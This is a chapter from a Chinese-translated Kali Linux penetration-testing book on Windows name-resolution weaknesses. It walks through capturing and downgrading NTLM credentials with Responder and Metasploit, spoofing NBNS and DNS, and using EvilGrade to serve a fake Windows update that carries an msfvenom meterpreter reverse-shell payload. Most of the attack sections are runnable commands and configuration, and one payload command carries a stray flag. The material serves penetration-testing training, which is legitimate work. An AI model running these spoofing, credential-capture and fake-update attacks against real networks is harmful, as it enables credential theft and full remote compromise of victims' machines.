微软和类似公司希望获得你所有的业务，而不仅仅是其中的一部分，并且竭尽全力来破坏常见的协议。我们又回到了供应商锁定。当然，我们会使我们的系统易于使用并且易于连接到您为我们支付的其他系统，但是当涉及到与 UNIX 服务器通信时就不要想了。哦，你想访问文件服务器？那就购买我们的服务器，然后你的个人电脑就能够与服务器通信。因此，由于供应商锁定，我们被困在 NetBIOS 和 NTLM 服务中。

NTLM 的目的是在网络上查找系统和资源。在活动目录域环境中，Kerberos LDAP 和 DNS 负责登录和共享网络资源的位置。DNS 是 TCP/IP 套件的协议，用于此用途，并且是我们每天在互联网上使用的协议，用于查找我们要找的东西。Windows 确实使用 DNS 进行系统调用，但如果没有使用**完全合格的域名**（**FQDN**），那么 Windows 会默认回到 NTLM 进行系统查找。这就是我们的攻击向量：使系统查找恢复到 NTLM，因此信息现在通过 ARP 广播发送，而不是通过使用 TCP 或 UDP 直接调用 DNS 服务器来传输数据。

当用户尝试使用计算机名称连接到服务时，Windows 会查看以下内容以将名称解析为 IP 地址：

+   本地主机文件—`C:\Windows\System32\drivers\etc\hosts`

+   DNS

+   NBNS

你可能会问，名字查找是如何绕过 DNS 进行查找的？嗯，这是设计上的。Windows 可能在域中使用 DNS 进行查找，但系统仍然喜欢使用机器名称的缩写版本，或者它们的 NetBIOS 名称，因此机器将通过网络发送 ARP 广播。当使用 IP 地址访问网站时，也会发生这种情况，而不是使用域名。

域控制器默认情况下仍会接受此登录。因此，我的机器登录为`\\SRV1`而不是`//SRV1.companyname.net`。在这些广播数据包中包含了我的机器名称、IP 地址、用户名和密码，因此任何通过数据包嗅探器（如 Wireshark） passively 监听网络的人都可以轻松捕获这些凭据。稍微进行 ARP 欺骗，这些凭据就会在整个网络中不断出现，然后...

NTLM 仍然在以下情况下使用：

+   客户端正在使用 IP 地址对服务器进行身份验证

+   客户端正在对属于具有传统 NTLM 信任而不是传递性跨森林信任的不同活动目录森林的服务器进行身份验证

+   客户端正在对不属于域的服务器进行身份验证

+   不存在活动目录域（通常称为工作组或点对点）

+   防火墙本来会限制 Kerberos 所需的端口（通常是 TCP 88）

基本上，NTLM 就像在拥挤的酒吧中大声喊出你的用户名和密码，而 AD/DNS 更像是两个人之间的悄悄交谈。

# 嗅探和捕获流量

在本节中，我们将看到我们在第四章中学到的内容的实际用途，即*嗅探和欺骗*，关于嗅探和捕获工具。当我们在[第四章](https://cdp.packtpub.com/kali_linux_2018_x__windows_penetration_testing_/wp-admin/post.php?post=332&action=edit#post_162)中运行这些工具时，我们捕获了 NTLM 和明文密码。我们还找到了主要目标的位置。在这里，我们将使用从我们劳动成果中获得的黄金密钥。通常，第一次捕获哈希并查看它时，你会想，*我能用它做什么？它是加密的*。毕竟，你不是被告知，如果它被加密了，那么它就受到了保护吗？事实是，当我侵入 Windows 系统时，有一半以上的时间我并不知道实际密码。为什么要花时间破解密码，当你可以直接*传递哈希*呢？

# 使用 Ettercap 数据

以下的屏幕截图是我们在[第四章](https://cdp.packtpub.com/kali_linux_2018_x__windows_penetration_testing_/wp-admin/post.php?post=332&action=edit#post_162)中的中毒攻击的捕获数据的副本，*嗅探和欺骗*，使用 Ettercap：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/c146a3b2-3665-4866-8691-0853fc85aa59.png)

# 使用 NBTscan 进行 NetBIOS 扫描

在 Windows 域环境中工作时，您最好知道您正在攻击的域名。有时，您可以使用默认的`WORKSTATION`组收集一些凭据，但是这个方便的小工具可以快速找到您要查找的域信息。以下是 NBTscan 的帮助文件：

要从命令行获取帮助文件，请输入以下内容：

```
nbtscan 
No -h or -help is needed. 
NBTscan Help File 
NBTscan version 1.5.1\. Copyright (C) 1999-2003 Alla Bezroutchko. 
This is a free software and it comes with absolutely no warranty. 
You can use, distribute and modify it under terms of GNU GPL. 

Usage: 
nbtscan [-v] [-d] [-e] [-l] [-t timeout] [-b bandwidth] [-r] [-q] [-s separator] [-m retransmits] (-f filename)|(<scan_range>)  
 -v  verbose output. Print all names received 
   from each host 
 -d  dump packets. Print whole packet contents. 
 -e  Format output in /etc/hosts format. 
 -l  Format output in lmhosts format. 
   Cannot be used with -v, -s or -h options. 
 -t timeout wait timeout milliseconds for response. 
   Default 1000\. 
 -b bandwidth Output throttling. Slow down output 
   so that it uses no more that bandwidth bps. 
   Useful on slow links, so that outgoing queries 
   don't get dropped. 
 -r  use local port 137 for scans. Win95 boxes 
   respond to this only. 
   You need to be root to use this option on Unix. 
 -q  Suppress banners and error messages, 
 -s separator Script-friendly output. Don't print 
   column and record headers, separate fields with separator. 
 -h  Print human-readable names for services. 
   Can only be used with -v option. 
 -m retransmits Number of retransmits. Default 0\. 
 -f filename Take IP addresses to scan from file filename. 
   -f - makes nbtscan take IP addresses from stdin. 
 <scan_range> what to scan. Can either be single IP 
   like 192.168.1.1 or 
   range of addresses in one of two forms:  
   xxx.xxx.xxx.xxx/xx or xxx.xxx.xxx.xxx-xxx. 
Examples: 
 nbtscan -r 192.168.1.0/24 
  Scans the whole C-class network. 
 nbtscan 192.168.1.25-137 
  Scans a range from 192.168.1.25 to 192.168.1.137 
 nbtscan -v -s : 192.168.1.0/24 
  Scans C-class network. Prints results in script-friendly 
  format using colon as field separator. 
  Produces output like that: 
  192.168.0.1:NT_SERVER:00U 
  192.168.0.1:MY_DOMAIN:00G 
  192.168.0.1:ADMINISTRATOR:03U 
  192.168.0.2:OTHER_BOX:00U 
  ... 
 nbtscan -f iplist 
  Scans IP addresses specified in file iplist. 
```

如果您首先运行 Ettercap，则目标列表将为您提供一些地址，以便快速查找域信息，或者您可以使用此工具通过使用 CIDR 网络列表扫描整个本地子网。对于此网络，将是`172.16.42.0/24`：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/e7978b14-0cd6-4226-aa62-8aa5bf952ab4.png)

现在我们有了域名（`LAB1`）或工作组名，我们可以继续使用 Responder。 

# Responder-哈希如此之多，时间如此之少

**Responder.py**是一个攻击几乎所有 NTLM 和 SMB 协议向量的 Python 工具。在下面的屏幕截图中，我们有 Responder 帮助文件。我们将介绍一些选项及其用途。

要从命令行访问 Kali Linux 上的 Responder 帮助文件，请输入以下内容：

```
responder -help  
```

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/4d9b9336-865f-4e05-b08b-6c9ef432ace4.png)

您将不得不使用的主要标志是`-I`或`-interface=`标志，因为您必须告诉 Responder 使用哪个接口。所有其他标志都是可选的，但这些标志可以对您的攻击进行很好的控制。

Responder 带有自己的密码和哈希收集工具，但我们也可以使用 Metasploit 来捕获我们的战利品，以便我们可以使用这些凭据在使用 Metasploit 模块进行进一步攻击。我们将介绍收集捕获凭据的两种方法。

首先，我们将设置 Responder 执行其自己的操作并收集其自己的哈希。首先是`-I`标志-将其设置为活动接口。在这里，它将是`wlan0`。这是最重要的标志。Responder 将在没有设置任何其他标志的情况下运行默认配置，但必须设置接口才能运行。在下面的命令中，我还设置了`-w`以启动`wpad`服务器；`-F`标志以强制在`wpad`服务器上进行基本身份验证，这将以明文捕获和`wpad`登录；尝试将 NTLM 身份验证降级为 NTLMv1 的`-lm`标志；将 NTLM HTTP 连接降级为基本或明文的`-b`标志；将`wpad`连接重定向的`-r`标志；以及将域设置为攻击的`-d LAB1`标志。然后按*Enter*运行。然后，您将获得正在运行的服务的屏幕打印，并且攻击将开始。完整的命令如下：

```
responder -I wlan0 -w -F --lm -b -r -d LAB1  
```

攻击开始后，Responder 会在网络上中毒 SMB ARP 广播。运行此攻击的最佳时间是在网络上有大量用户流量时。如果在非工作时间运行此攻击，并且没有用户流量，则只会捕获系统帐户。必须有用户流量才能捕获用户凭据。

在下面的屏幕截图中，我们看到了中毒攻击的开始以及对管理员帐户凭据的捕获：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/20faa5aa-a719-4e5c-b7d4-a7c76ef8aa90.png)

在前面的截图中，我们可以看到我们已经从`\\WIN10-01`工作站捕获了管理员登录。这是在用户从工作站登录到域时捕获的。请注意，这是一个 NTLMv2 哈希，这是一个带盐的 NTLMv1 哈希。带盐的哈希基本上是重新哈希的哈希。在 SMB 登录的挑战和响应部分期间，交换了一个 16 位的随机哈希值。然后，NTLMv1 56 位哈希值与此随机值进行了哈希。然后将这个新的哈希传输到服务器，这就是 NTLMv2 哈希值。由于盐是一个随机值，捕获的 v2 哈希是不可重放的，但好消息是，诸如老实的 John the Ripper 或 Hashcat 之类的程序可以离线破解这些哈希。它们只是不能用于*传递哈希*风格的攻击。

在下面的截图中，我们有`LAB1\rred`的登录。同样，这是用户登录到域的情况，再次捕获了不可重放的 NTLMv2 哈希。在两次捕获之后，您会注意到，几行下面，Responder 再次捕获了登录，但没有在屏幕上重复显示。它仍然作为单独的哈希记录在日志文件中。在日志文件中，您可以看到挑战和响应哈希从文件中的不可重放的更改。实际密码没有改变，但在响应之间，挑战和响应哈希已经改变：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/391ca14a-d7b4-4866-8c25-f7b517faf2af.png)

在下面的截图中，我们可以看到发送到网络上各台机器的有毒答案。接下来，我们可以看到 HTTP 捕获。这个捕获来自将-b 标志设置为将 HTTP 登录降级为明文，而不是使用 NTLM 哈希作为密码。正如我们所看到的，我们有一组明文用户凭据。中奖！看一下下面的截图：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/4166f23d-3109-438f-bb1c-63ddec607bf7.png)

在我们的小攻击之后，让我们看看日志。攻击的所有屏幕输出都存储在 Responder 的日志目录中的单独文件中。默认情况下，这可以在`/usr/share/responder/logs`找到：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/102a3a61-5839-41e1-b551-7a8d8a69e681.png)

在前面的截图中，我们看到了攻击期间输出的各种日志。Responder 非常好地将这些数据分解为可用的部分。

在此运行中，`Analyzer-Session.log`是空白的。当您运行`-A`标志时，NBT-NS 响应的原始输出将保存到此文件中。

`Config-Responder.log`文件是在运行 Responder 时攻击期间使用的配置和变量的输出。

`Poisoners-Session.log`是有毒会话的会话输出。

`HTTP-Basic-ClearText-<IPAddress>.txt`文件是从`<IPAddress>`捕获的凭据的输出。每个系统的捕获凭据都保存在单独的文件中。我们可以在下面的截图中看到我们攻击中列出的两个文件：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/554f39fa-e1ee-4165-b47e-0408300df5c8.png)

`SMB-NTLMv2-<IPAddress>.txt`文件是捕获的不可重放的哈希和用户帐户。该文件格式为所谓的*John*格式。这意味着 John the Ripper 可以直接读取文件而无需任何额外格式。Hashcat 和大多数其他密码破解程序也可以读取这些文件而无需问题。在运行攻击时，输出显示了重复的捕获，但没有显示捕获的哈希。在下面的截图中，我们可以看到所有捕获的哈希。请注意，每次捕获时哈希值都不相同，但密码没有改变。这就是盐在起作用：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/27254163-6e2e-4d61-8c76-cef9b7e8fbce.png)

在通过您选择的密码破解程序运行之前，删除文件中除一个条目之外的所有内容。这将缩短运行时间，因为破解程序不必运行所有不同的盐。

# 使用 Responder 与 Metasploit

现在我们将使用 Responder 并将捕获发送到正在运行的 Metasploit 模块。这样，凭据将保存到 Metasploit 数据库，并且在运行 Metasploit 的攻击时可以使用捕获的凭据。基本上，我们要做的是禁用 Responder 工具包中提供的捕获服务器，并使用 Metasploit 的捕获服务器运行相同的服务器。

要禁用 Responder 的服务器，我们将编辑 Responder 配置文件。文件位于`/etc/responder/Responder.conf`。在您喜欢的文本编辑器中打开文件。在文件顶部，您会看到服务器列表，配置设置为`On`-将这些设置更改为`Off`并保存文件：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/e9c2d461-d8e7-44b1-9332-083cd9b38544.png)

更改后的文件如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/a19bb35a-eb23-40d2-aa81-782815ab0ebb.png)

接下来，我们需要启动 Metasploit 并启动捕获服务器。要启动 Metasploit，请运行以下命令：

```
msfdb start # This will start the database.
msfconsole # This will start the console.  
```

让我们启动服务器。启动顺序在这里并不重要，但是这些服务器是您进行此攻击所需的三个重要组成部分。在切换到您的工作区后，运行以下命令：

```
use auxiliary/server/wpad # This set up the wpad module for use.
show options # This will show the options.  
```

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/131e8c77-7a26-4bb8-ac7b-f34138f0cb80.png)

我发现最好设置`SRVHOST`设置。将其保持为`0.0.0.0`将使服务器在列出的端口上监听所有接口。硬设置`SRVHOST`将减少任何网络/接口混乱。特别是如果您运行多个活动接口，攻击可能会困惑于应该选择哪种方式，或者诸如`wpad`之类的服务将主动监听错误的接口。最好进行硬设置以确保。对于此攻击，本地 IP 地址为`172.16.42.139`：

```
set SRVHOST 172.16.42.139
```

要启动它，请运行以下命令：

```
    run -j # The -j flag will run the job in the background.

```

接下来，让我们使用以下命令启动 SMB 捕获服务器：

```
use auxiliary/server/capture/smb
show options  
```

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/241649d8-ec9c-4c71-b42e-f531bbccf93c.png)

再次设置`SRVHOST`。您可以使用向上箭头键返回到上次设置的属性：

```
set SRVHOST 172.16.42.139
run -j # Again this will run the job in the background
```

有两种方法可以捕获 HTTP 流量。一种是`auxiliary/server/capture/http_ntlm`模块。此模块将以其 NTLM 哈希值捕获凭据。这些哈希值将是可重放的，因为我们的攻击服务器发送了挑战。之前定义了挑战盐值-我们看到它设置为`1122334455667788`。此攻击中捕获的哈希值可以在* Pass the Hash * -style 攻击中使用。要设置和运行此模块，请运行以下命令：

```
use auxiliary/server/capture/http_ntlm
show options  
```

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/ffe2c9ce-d224-4fb3-b7eb-c71b814914c4.png)

再次设置`SRVHOST`。您可以使用向上箭头键返回到上次设置的方式：

```
set SRVHOST 172.16.42.139  
```

由于`wpad`服务器正在端口`80`上运行，我们需要将此服务移动到不同的 HTTP 端口，因此我们将设置它在端口`443`上运行，并将 SSL 设置为 true，如下所示：

```
set SRVPORT 443 # Set to local service port to 443
set SSL true # This sets a self-signed cert to the port.
set JOHNPWFILE john-cap.txt # This will set an output file.
run -j # Again this will run the job in the background
```

第二种方法将导致 NTLM 登录降级为明文，就像 Responder 附带的 HTTP 服务器一样。使用此捕获方法，凭据将准备好使用。您一次只能使用其中一个模块。尝试同时运行两者将导致第二个崩溃，并有时会导致第一个 HTTP 服务器开始挂起。

要设置并启动 HTTP 基本捕获服务器，请运行以下命令：

```
use auxiliary/server/capture/http_basic
show options  
```

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/1a856477-c062-40d6-a332-52cb5989e931.png)

再次设置`SRVHOST`。您可以使用向上箭头键返回到上次指定的设置。

如前所述，由于`wpad`服务器正在端口`80`上运行，我们需要将此服务移动到不同的 HTTP 端口，因此我们将设置它在端口`443`上运行，并将 SSL 设置为 true：

```
set SRVPORT 443 # Set to local service port to 443
set SSL true # This sets a self-signed cert to the port.
set SRVHOST 172.16.42.139
run -j # Again this will run the job in the background
jobs # Below we see the three running jobs.  
```

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/384cfceb-ec5d-4a33-9d8d-3b260aa6e99c.png)

我们还可以运行欺骗程序来帮助捕获。这是`auxiliary/spoof/nbns/nbns_response`模块。帮助文件中有关于此的最佳描述，因此我在这里提供了它：

描述：

这个模块伪造**NetBIOS 名称服务**（**NBNS**）响应。它将监听发送到本地子网广播地址的 NBNS 请求，并伪造响应，将查询机器重定向到攻击者选择的 IP。与`auxiliary/server/capture/smb`或`auxiliary/server/capture/http_ntlm`结合使用，这是一种高效收集常见网络上可破解哈希的方法。此模块必须以 root 身份运行，并将绑定到所有接口上的 UDP/137 端口。

参考：

[`www.packetstan.com/2011/03/nbns-spoofing-on-your-way-to-world.html`](http://www.packetstan.com/2011/03/nbns-spoofing-on-your-way-to-world.html)

对于我们的攻击，我们将欺骗域控制器。域控制器的 IP 地址是`172.16.42.5`。因此，让我们设置我们的欺骗者并运行如下：

```
use auxiliary/spoof/nbns/nbns_response
set INTERFACE wlan0 # your local network interface. For this attack it is wlan0
set SPOOFIP 172.16.42.5 # the victim IP address.
run -j # This will run the job in the background.
```

我们可以在一开始就看到模块正在欺骗来自`172.16.42.105`的`wpad`请求，而此时 Responder 尚未运行。

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/d9ed2693-7a23-4aae-9361-5d75e045a459.png)

现在我们准备再次启动 Responder。在 Kali 上启动一个新的终端窗口，并使用与上次相同的标志启动 Responder。这次运行的唯一区别是，中毒攻击将运行，但 Responder 服务器将被禁用，Metasploit 将捕获这次的流量。

在以下截图中，我们看到 Metasploit 在`172.16.42.105`上欺骗和捕获流量。我们可以看到模块响应到域控制器的地址`172.16.42.5`：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/ed6ed5f1-24e8-4435-bbd7-5501ff618901.png)

在以下截图中，我们看到捕获的 SMB 流量进来，通过查看挑战的长度，我们可以知道这些是 NTLMv2 哈希。如果运行`creds`命令，输出将显示这些是不可重放的：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/cbcf8cc6-a67e-4c6f-8ebc-6c151f4ed42d.png)

通过运行`creds`命令，我们可以看到捕获的凭据，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/70fc75f0-5531-4025-a1ca-16fd3b1d5594.png)

好的，这些是不可重放的哈希，但我们有一个普通捕获流量中没有的部分谜题，比如我们使用 Responder 服务捕获的内容。这次，我们有挑战盐。当我们设置 SMB 捕获模块时，挑战盐设置为`1122334455667788`。因此，如果我们通过 John the Ripper 运行这个不可重放的哈希，以及捕获的有盐哈希，我们基本上只是破解 NTLM 哈希，而不是浪费 CPU 时间计算盐。在上一张截图中，输出是以 John 格式显示的，我们可以在哈希的第一部分中看到挑战盐。这基本上破坏了有盐哈希的安全性。

# NetBIOS 响应 BadTunnel 暴力欺骗

这也是一个 NBNS 名称欺骗者，但与之前讨论的不同，这个可以穿越使用 NAT 的防火墙连接。大多数 NetBIOS 欺骗者只在本地网络上工作。与其他工具一起使用，这是一个很好的欺骗者。

关于这个欺骗者如何工作的最好描述来自信息文件，如下所示：

```
   Name: NetBIOS Response "BadTunnel" Brute Force Spoof (NAT Tunnel) 
  Module: auxiliary/server/netbios_spoof_nat 
  License: Metasploit Framework License (BSD) 
   Rank: Normal 
 Disclosed: 2016-06-14 

Provided by: 
 vvalien 
 hdm <x@hdm.io> 
 tombkeeper 

Available actions: 
 Name  Description 
 ----  ----------- 
 Service  

Basic options: 
 Name  Current Setting Required Description 
 ----  --------------- -------- ----------- 
 NBADDR 172.16.42.139  yes   The address that the NetBIOS name should resolve to 
 NBNAME WPAD      yes   The NetBIOS name to spoof a reply for 
 PPSRATE 1000      yes   The rate at which to send NetBIOS replies 
 SRVHOST 172.16.42.139  yes   The local host to listen on. 
 SRVPORT 137       yes   The local port to listen on. 

```

描述：

该模块监听 NetBIOS 名称请求，然后不断向目标发送 NetBIOS 响应，以获取给定主机名的恶意地址。在高速网络上，PPSRATE 值应增加以加快攻击速度。例如，当欺骗 WPAD 查找时，约 30,000 的值几乎 100%成功。远程目标可能需要更多时间和更低的速率才能成功攻击。该模块在目标位于 NAT 网关后时起作用，因为 NetBIOS 响应流将在初始设置后保持 NAT 映射活动。要触发对 Metasploit 系统的初始 NetBIOS 请求，强制目标访问指向相同地址的 UNC 链接（HTML、Office 附件等）。这个 NAT 穿透问题被发现者命名为 BadTunnel 漏洞，发现者是 Yu Yang（`@tombkeeper`）。微软补丁（MS16-063/MS16-077）影响了代理主机（WPAD）主机的识别方式，但并没有改变 NetBIOS 请求的可预测性。

为了设置这个模块，我们需要设置以下参数：

```
set NBADDR 172.16.42.139 # Set to the update server's address. Our Kali machine.
set SRVHOST 172.16.42.139 # Set this to keep down interface confusion.
set PPSRATE 30000 # Since we are on a local network we have set this to the max setting.  
```

一旦我们设置并运行了 EvilGrade，我们将运行以下命令：

```
run -j  # This will run the spoofer in the background.  
```

现在我们已经设置好了 NBNS 欺骗器，让我们设置好 EvilGrade 并让它运行起来。

# EvilGrade

EvilGrade 是一个模块化框架，允许用户通过注入假更新来利用升级实现，不仅适用于 Windows 操作系统，还适用于其他流行的 Windows 应用程序。列表很长。该框架配备了预制的二进制文件（代理），但也可以将自定义二进制文件推送到受害者机器上。该框架配备了自己的 Web 服务器和 DNS 服务器模块。

在这次攻击中，我们将利用 Windows 的`wpad`服务并推送一个恶意的 Windows 更新。我们将构建自己的有效负载，而不是使用预先构建的二进制文件，这样我们就可以上传 Metasploit Meterpreter shell 到受害者机器。这样我们就可以使用 Metasploit 工具进行进一步的妥协。

EvilGrade 不是 Kali 的默认安装程序，因此我们需要从存储库安装它。因此，在保持 BadTunnel 窗口打开的同时，现在打开一个新的终端窗口并运行以下命令：

```
apt-get update # As normal update the repo first.
apt-get -y install isr-evilgrade # This will install Evilgrade.  
```

安装完成后，我们准备好了。打开一个新的终端窗口，从命令行输入以下内容：

```
evilgrade
```

您将看到以下输出。当它们加载时，您将看到可用模块的列表。该框架具有类似于 Metasploit 的界面：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/bd1bec9d-dc31-4e9d-b1d4-0fcc12ca5e64.png)

以下屏幕截图显示了`modules`输出的继续：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/22242ab4-90cc-4669-9304-a6d52c4c5cb9.png)

通过运行`show options`，我们可以看到模块列表。注意所有不同类型应用程序的模块，包括硬件供应商的更新服务。是的，你可以上传 rootkit 到，比如，宏碁或联想笔记本电脑。这超出了本书的范围，但通过一点配置，就像我们在这里所做的一样，这个工具就能胜任：

```
evilgrade> show modules 

List of modules: 
=============== 

acer 
allmynotes 
amsn 
appleupdate 
appstore 
apptapp 
apt 
asus 
atube 
autoit3 
bbappworld 
blackberry 
bsplayer 
ccleaner 
clamwin 
cpan 
cygwin 
dap 
divxsuite 
express_talk 
fcleaner 
filezilla 
flashget 
flip4mac 
freerip 
getjar 
gom 
googleanalytics 
growl 
inteldriver 
isopen 
istat 
itunes 
jdtoolkit 
jet 
jetphoto 
keepass 
lenovo 
lenovoapk 
lenovofirmware 
linkedin 
miranda 
mirc 
nokia 
nokiasoftware 
notepadplus 
openbazaar 
openoffice 
opera 
orbit 
osx 
paintnet 
panda_antirootkit 
photoscape 
port 
quicktime 
safari 
samsung 
skype 
sparkle 
sparkle2 
speedbit 
sunbelt 
sunjava 
superantispyware 
teamviewer 
techtracker 
timedoctor 
trillian 
ubertwitter 
vidbox 
virtualbox 
vmware 
winamp 
winscp 
winupdate 
winzip 
yahoomsn 
- 78 modules available. 
```

安全提示：

这是 Windows 系统上的一个重要攻击向量。与 Linux 不同，Linux 中所有软件包都可以从中央存储库下载并通过 GPG 密钥进行验证，而 Windows 应用程序中的每个应用程序都依赖于其自己的更新程序。这使得这种攻击方式可以用于许多常见应用程序，这些应用程序通常不会被视为攻击向量。这也是为什么在使用本书中所示的 Kali 时，应该从存储库下载应用程序，避免从其他网站下载和安装单独的应用程序。

我们需要为 DNS 服务设置 IP 地址。输入以下命令：

```
show options # Shows EvilGrade's default settings.
set DNSAnswerIp 172.16.24.139 # Set the DNS server's address.     
```

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/6d5e47f3-c123-4e39-8924-9099fd387cf9.png)

在这次攻击中，我们将使用 Windows 更新服务（wpad），因此要加载 Windows 更新模块，请输入以下内容：

```
evilgrade>configure winupdate 
```

接下来，我们需要我们的有效载荷。要构建有效载荷，我们将使用 MSFvenom。打开一个新的终端窗口，然后从命令行中输入以下代码。`-p`标志是要使用的有效载荷。我们正在使用`windows/meterpreter/reverse_tcp`有效载荷。由于这是一个反向 shell，您必须设置有效载荷在攻击机器上调用的本地主机和本地端口。我们的 Kali 机器在`172.16.42.139`。

我们将端口设置为`445`，这是一个标准的 Windows 端口，并使用`-o`标志将其保存到`/tmp/windowsupdate.exe`：

```
msfvenom -p windows/meterpreter/reverse_tcp -e LHOST=172.16.42.139 LPORT=445 -f exe -o /tmp/windowsupdate.exe 
```

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/35cce0f2-19da-4421-bb4f-8010723ab26b.png)

我们已将有效载荷保存到`/tmp/windowsupdate.exe`，因此我们需要将代理设置为此路径。

在运行的 EvilGrade 框架窗口中，输入以下内容将有效载荷设置为我们的自定义有效载荷：

```
set agent /tmp/windowsupdate.exe # This sets the agent to the custom agent.
show options # This will show the module's options to check the settings.
start # This will start both the DNS and Web service for the attack.  
```

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/3f277827-fadf-48a1-a3ac-cf3f39bbcc19.png)

现在，为了允许连接，我们需要设置一个 multi/handler 来接受系统被入侵后的入站连接。从我们正在运行 BadTunnel 的 Metasploit 终端开始，我们将启动`multi/handler`并在后台运行。在 Metasploit 中，运行以下命令：

```
use exploit/multi/handler
set LHOST 172.16.42.139 # Kali's IP address.
set LPORT 445 # Set the listening port. The payload is set to 445.
run -j # Start the handler in the background.  
```

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/e89e7ba0-13e1-4c87-82bb-414e83240ae4.png)

# Ettercap 设置

Ettercap 是一个很棒的欺骗工具，在本书中我们已经经常使用它，现在我们将再次使用它。我们需要欺骗 DNS 服务并将其指向我们的 Kali 框。Ettercap 附带了一个专门用于此目的的插件。在这次攻击中，由于我们的 Kali 框局限于受害者网络，我们可以使用 GUI 版本。您会在 Sniffing & Spoofing | ettercap-graphical 下找到它。该过程如下：

1.  首先，我们需要设置我们将在欺骗时使用的 DNS A 记录。如果这是您第一次欺骗 DNS，您需要使用您喜欢的文本编辑器创建一个新文件。将以下 A 记录添加到文件中。通过通配符记录（`*.`），我们应该是好的，如下所示：

```
*.microsoft.com  A 172.16.42.139 # Kali's address
*.windowsupdate.com  A 172.16.42.139  
```

将此文件保存到`/usr/share/ettercap/etter.dns`。关闭编辑器-您的欺骗记录已准备就绪：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/b546ecbf-cdd4-4ec5-864e-fc61307dee55.png)

1.  接下来，我们需要设置活动接口来欺骗流量，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/af955885-cb75-4cff-93ba-0fff8b00dbfa.png)

1.  接下来，我们需要激活 DNS 欺骗插件。在菜单栏中，转到插件，然后管理插件。这将为您提供列出所有各种可用插件的窗口：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/31b5dda6-c956-4da2-827a-87931d64fbb9.png)

1.  接下来，从列表中选择 dns_spoof 并双击它。左侧将出现一个星号，表示它已激活。您还将在 Ettercap 底部的文本窗口中看到这一点：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/6061473b-580d-4488-819b-2385a3a3a2eb.png)

1.  接下来，让我们运行扫描以找到我们的目标，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/a66b409d-6b93-43bb-8e1a-b9bb488afed1.png)

扫描后，我们需要将路由器选为目标 1，将我们的目标机器（`win7-01`）选为目标 2。您可以通过选择地址并右键单击来执行此操作-菜单将允许您设置目标编号：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/5d7ffae8-ccd6-4a34-a14d-7ce1a2c30f27.png)

选择目标后，您可以通过转到菜单栏中的目标|当前目标来查看它们。要启动该过程，请转到菜单栏中的 Mitm | ARP Poisoning 并单击。您将获得一个框来设置嗅探的类型。一旦开始，您可以在底部屏幕中观看输出，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/e2df5a3a-a3e9-4ba5-9282-c7989ab43f5f.png)

# 攻击

我们现在已经设置好了，我们的攻击已经完全运行。我们正在运行 BadTunnel NBNS 欺骗的 Metasploit，EvilGrade 同时运行 DNS 服务器和 Web 服务器以提供带有虚假 Windows 更新站点的更新。我们还为有效载荷设置了处理程序以进行连接。现在我们只是在等待我们毫无戒心的受害者更新他们的 Windows 系统。

在 Windows 工作站上，当受害者使用 IE 手动更新他们的系统时，他们会看到以下页面。看起来很正常-你可以看到地址栏中的地址说这个站点是[`www.microsoft.com`](http://www.microsoft.com)。没有真正的警告标志表明这不是微软的站点。

所以，让我们点击更新我们的计算机！你知道要保持安全和安全：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/cb7f4556-8d5f-4a44-84ad-c4cee3b7a03e.png)

我们点击“立即下载并安装”按钮，我们得到一个正常的文件下载框，提供一个`update97543.exe`文件。甚至看起来是由`windowsupdate.microsoft.com`签名的。这个文件肯定是合法的吧？

让我们点击运行并获取我们的更新：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/a4477fb6-8257-4591-b9b7-4acf1006936e.png)

